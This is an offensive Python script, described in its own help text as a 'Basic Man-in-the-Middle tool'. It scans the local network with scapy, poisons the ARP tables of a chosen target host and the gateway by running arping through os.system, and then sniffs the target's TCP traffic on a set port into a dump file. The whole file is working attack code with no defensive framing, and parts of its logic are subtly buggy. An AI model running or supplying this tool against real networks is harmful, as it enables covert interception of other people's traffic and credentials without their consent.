#!/usr/bin/env python
import logging
import argparse
import sys
import os
import subprocess
from scapy.all import *

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

mimetypes = ["multipart/form-data","text/plain","text/html","multipart/related",
				"multipart/alternative","multipart/mixed","message/http",
				"application/pdf"]
target = None
output = "dump"

class Network:
	ip=""
	gateway=""
	netmask=""
	size=""
	interface=""

	def int2addr(self, _addr):
		return socket.inet_ntoa(struct.pack("!I",_addr))

	def addr2int(self,_addr):
		return struct.unpack("!I",socket.inet_aton(_addr))[0]

	def setIp(self,_ip):
		self.ip = self.int2addr(_ip)

	def getIp(self):
		return self.addr2int(self.ip)

	def setMask(self,_netmask):
		self.netmask = self.int2addr(_netmask)

	def isValid(self):
		return self.ip and self.netmask and self.gateway

class Host:
	ip = ""
	mac = ""

def mesg(mesg):
	print "[[92;1m+[00m] {}".format(mesg)

def warn(mesg):
	print "[[93;1m![00m] {}".format(mesg)

def err(mesg,exitCode):
	print "[[91;1m-[00m] {}".format(mesg)
	sys.exit(exitCode)

def initArgs():
	parser = argparse.ArgumentParser(
		description="Basic Man-in-the-Middle tool"
	)
	parser.add_argument("-l","--list",action="store_true",
						help="List available targets")
	parser.add_argument("-i","--interface",type=str,help="Interface to use")
	parser.add_argument("-r","--router",type=str,help="Target rotuter  IP")
	parser.add_argument("-t","--target",type=str,help="Target host IP")
	parser.add_argument("-p","--port",type=int,help="Port to sniff")
	parser.add_argument("-o","--output",type=str,help="Output file")
	return parser

def poisonArp(_iface,_spoofIp,_targetIp):
	cmd = "arping -Uqi {} -S {} -w 2000 {} &".format(_iface,_spoofIp,_targetIp)
	os.system(cmd);

def getNetworkSize(_netmask):
	netmask = _netmask.split(".")
	binStr = ""
	for octet in netmask:
		binStr += bin(int(octet))[2:].zfill(8)
	return str(len(binStr.rstrip("0")))


def getNetwork(_interface):
	network = Network()
	network.interface = _interface
	for iface in conf.route.routes:
		if iface[3] == network.interface:
			if iface[2] == "0.0.0.0":
				network.gateway = iface[2]
			if iface[0] != 0:
				network.setIp(iface[0])
			if iface[1] != 0:
				network.setMask(iface[1])
	if network.isValid():
		network.size = getNetworkSize(network.netmask)
	else:
		network = False
	return network

def probeNetwork(_network):
	# Probe network for available devices
	p = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=_network.ip+"/"+_network.size)
	ans,unans = srp(p,timeout=2,verbose=0)
	return ans

def listDevices(_network):
	# List available devices
	devices = probeNetwork(_network)
	res = -1
	list = "[-] No devices found on network\n"
	if len(devices) > 0:
		list =	'''
+-------------------+----------------+
| {:17s} | {:14s} |
+-------------------+----------------+\n'''.format("MAC","IP")
		for device in devices:
			list = list + "| {:17s} | {:14s} |\n".format(device[1].hwsrc,device[1].psrc)
			list = list + "+-------------------+----------------+\n"
		res = 1
	return list,res

def svPkg(_pkg):
	global target
	global output
	global mimetypes
	if IP in _pkg:
		pDst = _pkg[IP].fields['dst']
		pSrc = _pkg[IP].fields['src']
		if pDst == target.ip or pSrc == target.ip and _pkg.haslayer(TCP):
			payload = _pkg.getlayer(TCP).payload
			with open(output,'a') as f:
				f.write(str(payload))
				mesg("Packet intercepted")

def sniffNetwork(_interface,_port):
	sniff(iface=_interface, lfilter=svPkg,
			filter="tcp and port {}".format(_port))

def main():
	global target
	global port
	if os.getuid() != 0:
		err("Program must be ran as root",1)
	parser = initArgs();
	if len(sys.argv) < 2:
		parser.print_help()
		sys.exit(1)
	args = parser.parse_args()
	if not args.interface:
		err("No interface specified",1)
	network = getNetwork(args.interface)
	if not network:
		err("Interface {} doesn't seem to be connected".format(args.interface),1)
	if args.list:
		list,res = listDevices(network);
		if res == 0:
			print list
			sys.exit(0)
		else:
			err(list,1)
	if not args.port:
		warn("No port specified, using 80")
		args.port = 80
	if not args.router:
		err("No target router specified",1)
		sys.exit(1)
	if not args.target:
		err("No target host specifed",1)
	if not args.output:
		warn("No output file specified. Using `dump`.")
	else:
		output = args.output
	if args.router and args.target:
		me = Host()
		me.mac = get_if_hwaddr(args.interface)
		devices = probeNetwork(network)
		router = Host()
		router.ip = args.router
		target = Host()
		target.ip = args.target
		for d in devices:
			if router.ip == d[1].psrc:
				router.mac = d[1].hwsrc
			elif target.ip == d[1].psrc:
				target.mac = d[1].hwsrc
		poisonArp(args.interface,router.ip,target.ip)
		mesg("Target ARP-table poisoned")
		poisonArp(args.interface,target.ip,router.ip)
		mesg("Gateway ARP-table poisoned")
		mesg("Sniffing network...")
		sniffNetwork(args.interface,args.port)
	exit(0)

if __name__ == '__main__':
	main()
